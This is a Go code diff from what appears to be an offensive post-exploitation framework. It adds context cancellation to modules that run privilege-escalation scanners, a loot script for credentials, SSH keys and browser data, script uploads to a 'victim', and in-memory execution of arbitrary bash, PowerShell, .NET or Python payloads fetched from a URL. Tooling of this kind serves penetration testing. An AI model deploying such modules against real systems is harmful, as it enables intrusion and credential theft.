@@ -12,7 +12,7 @@ type Module interface {
 	Category() string    // Category (e.g., "Linux", "Windows", "Misc", "Custom")
 	Description() string // Short description
 	ExecutionMode() string // "memory", "disk-cleanup", "disk-no-cleanup"
-	Run(session *SessionInfo, args []string) error
+	Run(ctx context.Context, session *SessionInfo, args []string) error
 }
 
 // ModuleRegistry holds all registered modules
@@ -141,8 +141,8 @@ func (m *PEASModule) Category() string    { return "linux" }
 func (m *PEASModule) Description() string { return "Run LinPEAS privilege escalation scanner" }
 func (m *PEASModule) ExecutionMode() string { return "memory" }
 
-func (m *PEASModule) Run(session *SessionInfo, args []string) error {
-	return session.RunScriptInMemory(URL_LINPEAS, args)
+func (m *PEASModule) Run(ctx context.Context, session *SessionInfo, args []string) error {
+	return session.RunScriptInMemory(ctx, URL_LINPEAS, args)
 }
 
 // LSEModule - Linux Smart Enumeration
@@ -153,12 +153,12 @@ func (m *LSEModule) Category() string    { return "linux" }
 func (m *LSEModule) Description() string { return "Run Linux Smart Enumeration" }
 func (m *LSEModule) ExecutionMode() string { return "memory" }
 
-func (m *LSEModule) Run(session *SessionInfo, args []string) error {
+func (m *LSEModule) Run(ctx context.Context, session *SessionInfo, args []string) error {
 	// Default to -l1 if no args provided
 	if len(args) == 0 {
 		args = []string{"-l1"}
 	}
-	return session.RunScriptInMemory(URL_LSE, args)
+	return session.RunScriptInMemory(ctx, URL_LSE, args)
 }
 
 // PSPYModule - Monitor processes without root (pspy64)
@@ -169,9 +169,9 @@ func (m *PSPYModule) Category() string    { return "linux" }
 func (m *PSPYModule) Description() string { return "Run pspy process monitor" }
 func (m *PSPYModule) ExecutionMode() string { return "disk-cleanup" }
 
-func (m *PSPYModule) Run(session *SessionInfo, args []string) error {
+func (m *PSPYModule) Run(ctx context.Context, session *SessionInfo, args []string) error {
 	// Default to pspy64, but could add detection for 32-bit systems
-	return session.RunBinary(URL_PSPY64, args)
+	return session.RunBinary(ctx, URL_PSPY64, args)
 }
 
 // LootModule - ezpz post-exploitation script (credentials, SSH keys, browser data)
@@ -182,8 +182,8 @@ func (m *LootModule) Category() string    { return "linux" }
 func (m *LootModule) Description() string { return "Run ezpz post-exploitation script" }
 func (m *LootModule) ExecutionMode() string { return "memory" }
 
-func (m *LootModule) Run(session *SessionInfo, args []string) error {
-	return session.RunScriptInMemory(URL_LOOT, args)
+func (m *LootModule) Run(ctx context.Context, session *SessionInfo, args []string) error {
+	return session.RunScriptInMemory(ctx, URL_LOOT, args)
 }
 
 // ============================================================================
@@ -204,7 +204,7 @@ func (m *PrivescModule) Category() string    { return "misc" }
 func (m *PrivescModule) Description() string { return "Upload multiple privilege escalation scripts" }
 func (m *PrivescModule) ExecutionMode() string { return "disk-no-cleanup" }
 
-func (m *PrivescModule) Run(session *SessionInfo, args []string) error {
+func (m *PrivescModule) Run(ctx context.Context, session *SessionInfo, args []string) error {
 	var scripts []string
 
 	// Select scripts based on detected platform
@@ -219,17 +219,30 @@ func (m *PrivescModule) Run(session *SessionInfo, args []string) error {
 
 	// Upload each script using Transferer (handles download + upload with nice output)
 	for _, url := range scripts {
+		// Check for cancellation
+		if ctx.Err() == context.Canceled {
+			return fmt.Errorf("cancelled by user")
+		}
+
 		filename := getFilenameFromURL(url)
 
 		// Download locally to temp with unique name
 		localPath := fmt.Sprintf("/tmp/gummy_%s", filename)
-		if err := DownloadFile(url, localPath); err != nil {
+		if err := DownloadFile(ctx, url, localPath); err != nil {
+			if ctx.Err() == context.Canceled {
+				return fmt.Errorf("cancelled by user")
+			}
 			continue
 		}
 
 		// Upload to victim's CWD with original filename
 		t := NewTransferer(session.Conn, session.ID)
-		t.Upload(context.Background(), localPath, filename)
+		t.SetPlatform(session.Platform) // IMPORTANT: Set platform for correct upload method
+		if err := t.Upload(ctx, localPath, filename); err != nil {
+			if ctx.Err() == context.Canceled {
+				return fmt.Errorf("cancelled by user")
+			}
+		}
 	}
 
 	return nil
@@ -258,7 +271,7 @@ func (m *ShellScriptModule) Category() string    { return "custom" }
 func (m *ShellScriptModule) Description() string { return "Run arbitrary bash script from URL" }
 func (m *ShellScriptModule) ExecutionMode() string { return "memory" }
 
-func (m *ShellScriptModule) Run(session *SessionInfo, args []string) error {
+func (m *ShellScriptModule) Run(ctx context.Context, session *SessionInfo, args []string) error {
 	if len(args) == 0 {
 		return fmt.Errorf("usage: run sh <url> [script args...]")
 	}
@@ -266,7 +279,7 @@ func (m *ShellScriptModule) Run(session *SessionInfo, args []string) error {
 	url := args[0]
 	scriptArgs := args[1:]
 
-	return session.RunScriptInMemory(url, scriptArgs)
+	return session.RunScriptInMemory(ctx, url, scriptArgs)
 }
 
 // PowerShellScriptModule - Run arbitrary PowerShell script from URL
@@ -277,7 +290,7 @@ func (m *PowerShellScriptModule) Category() string    { return "custom" }
 func (m *PowerShellScriptModule) Description() string { return "Run arbitrary PowerShell script from URL" }
 func (m *PowerShellScriptModule) ExecutionMode() string { return "memory" }
 
-func (m *PowerShellScriptModule) Run(session *SessionInfo, args []string) error {
+func (m *PowerShellScriptModule) Run(ctx context.Context, session *SessionInfo, args []string) error {
 	if len(args) == 0 {
 		return fmt.Errorf("usage: run ps1 <url> [script args...]")
 	}
@@ -285,7 +298,7 @@ func (m *PowerShellScriptModule) Run(session *SessionInfo, args []string) error 
 	url := args[0]
 	scriptArgs := args[1:]
 
-	return session.RunPowerShellInMemory(url, scriptArgs)
+	return session.RunPowerShellInMemory(ctx, url, scriptArgs)
 }
 
 // DotNetAssemblyModule - Run arbitrary .NET assembly from URL
@@ -296,7 +309,7 @@ func (m *DotNetAssemblyModule) Category() string    { return "custom" }
 func (m *DotNetAssemblyModule) Description() string { return "Run arbitrary .NET assembly from URL" }
 func (m *DotNetAssemblyModule) ExecutionMode() string { return "memory" }
 
-func (m *DotNetAssemblyModule) Run(session *SessionInfo, args []string) error {
+func (m *DotNetAssemblyModule) Run(ctx context.Context, session *SessionInfo, args []string) error {
 	if len(args) == 0 {
 		return fmt.Errorf("usage: run net <url> [assembly args...]")
 	}
@@ -304,7 +317,7 @@ func (m *DotNetAssemblyModule) Run(session *SessionInfo, args []string) error {
 	url := args[0]
 	assemblyArgs := args[1:]
 
-	return session.RunDotNetInMemory(url, assemblyArgs)
+	return session.RunDotNetInMemory(ctx, url, assemblyArgs)
 }
 
 // PythonScriptModule - Run arbitrary Python script from URL
@@ -315,7 +328,7 @@ func (m *PythonScriptModule) Category() string    { return "custom" }
 func (m *PythonScriptModule) Description() string { return "Run arbitrary Python script from URL" }
 func (m *PythonScriptModule) ExecutionMode() string { return "memory" }
 
-func (m *PythonScriptModule) Run(session *SessionInfo, args []string) error {
+func (m *PythonScriptModule) Run(ctx context.Context, session *SessionInfo, args []string) error {
 	if len(args) == 0 {
 		return fmt.Errorf("usage: run py <url> [script args...]")
 	}
@@ -323,5 +336,5 @@ func (m *PythonScriptModule) Run(session *SessionInfo, args []string) error {
 	url := args[0]
 	scriptArgs := args[1:]
 
-	return session.RunPythonInMemory(url, scriptArgs)
+	return session.RunPythonInMemory(ctx, url, scriptArgs)
 }
